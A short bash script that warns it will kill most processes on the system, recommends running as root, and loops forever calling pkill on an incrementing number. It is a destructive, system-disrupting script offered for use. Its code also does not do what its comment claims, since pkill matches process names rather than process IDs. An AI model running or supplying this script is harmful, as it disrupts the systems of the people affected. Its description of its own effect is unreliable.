#!/bin/bash
# WARNING: This script will kill most processes on the system.
# It is best run as root, but it also works in userland.

var=2
while true
do
  var=$(( $var + 1 ))
  pkill $var
done
